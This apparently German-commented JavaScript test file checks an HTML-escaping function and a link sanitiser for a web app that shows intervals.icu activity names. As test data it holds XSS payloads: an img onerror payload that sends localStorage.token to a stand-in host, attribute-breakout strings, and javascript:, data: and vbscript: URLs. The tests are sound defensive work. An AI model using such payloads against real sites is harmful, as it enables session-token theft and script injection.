// Ausfuehren: jsc --module-file=tests/sicher.test.js
import { escHtml, sicherLink } from '../js/sicher.js';

let pass = 0, fail = 0;
const ok = (n, c, x = '') => c ? (pass++, print(`  ok   ${n}`)) : (fail++, print(`  FAIL ${n} ${x}`));
const eq = (n, a, b) => ok(n, a === b, `(${a} != ${b})`);

const BASIS = 'https://example.test/app/';

print('\n--- Maskieren ---');
eq('spitze Klammern', escHtml('<b>'), '&lt;b&gt;');
eq('Anfuehrungszeichen', escHtml('a"b'), 'a&quot;b');
eq('einfache Anfuehrungszeichen', escHtml("a'b"), 'a&#39;b');
eq('kaufmaennisches Und', escHtml('a&b'), 'a&amp;b');
eq('Und zuerst, sonst doppelt maskiert', escHtml('&lt;'), '&amp;lt;');
eq('null wird leer', escHtml(null), '');
eq('undefined wird leer', escHtml(undefined), '');
eq('Zahlen ueberleben', escHtml(42), '42');
eq('die Null bleibt die Null', escHtml(0), '0');
eq('harmloser Text bleibt', escHtml('Zwift — Watopia'), 'Zwift — Watopia');

// Genau der Fall, der die Luecke war: ein Aktivitaetsname aus intervals.icu.
const angriff = '<img src=x onerror="fetch(\'//b.test?t=\'+localStorage.token)">';
const maskiert = escHtml(angriff);
ok('Angriffsname enthaelt kein < mehr', !maskiert.includes('<'));
ok('Angriffsname enthaelt kein > mehr', !maskiert.includes('>'));
ok('Angriffsname enthaelt kein rohes Anfuehrungszeichen', !maskiert.includes('"'));
ok('der Text selbst bleibt lesbar', maskiert.includes('img src=x'));

// Ein Attributausbruch braucht nur ein Anfuehrungszeichen.
ok('Attributausbruch geschlossen', !escHtml('" onmouseover="alert(1)').includes('"'));

print('\n--- Adressen ---');
eq('https bleibt', sicherLink('https://youtube.com/x', BASIS), 'https://youtube.com/x');
ok('http bleibt', sicherLink('http://a.test/', BASIS).startsWith('http://'));
eq('javascript: wird verworfen', sicherLink('javascript:alert(1)', BASIS), '');
eq('javascript: mit Grossbuchstaben ebenso', sicherLink('JavaScript:alert(1)', BASIS), '');
eq('javascript: mit fuehrendem Leerraum ebenso', sicherLink('  javascript:alert(1)', BASIS), '');
eq('data: wird verworfen', sicherLink('data:text/html,<script>1</script>', BASIS), '');
eq('vbscript: wird verworfen', sicherLink('vbscript:msgbox', BASIS), '');
eq('leer bleibt leer', sicherLink('', BASIS), '');
eq('null bleibt leer', sicherLink(null, BASIS), '');
eq('Unsinn ohne Schema wird relativ aufgeloest',
  sicherLink('video', BASIS), 'https://example.test/app/video');
ok('Anfuehrungszeichen in der Adresse werden maskiert',
  !sicherLink('https://a.test/"onmouseover="alert(1)', BASIS).includes('"'));

print(`\n========== Gesamt: ${pass} bestanden, ${fail} fehlgeschlagen ==========\n`);
